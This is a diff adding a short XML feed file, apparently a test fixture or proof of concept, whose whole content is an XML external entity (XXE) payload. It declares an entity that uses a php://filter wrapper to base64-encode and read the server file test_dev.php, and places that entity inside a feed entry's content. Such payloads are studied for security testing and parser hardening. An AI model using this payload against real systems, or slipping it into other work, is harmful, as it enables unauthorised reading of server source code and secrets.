@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE feed [
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=test_dev.php">
+]>
+<feed>
+    <title>test</title>
+    <description>test</description>
+    
+    <entry>
+      <title>Hello</title>
+      <link href="http://example.com"></link>
+      <content>&xxe;</content>
+    </entry>
+    
+</feed>
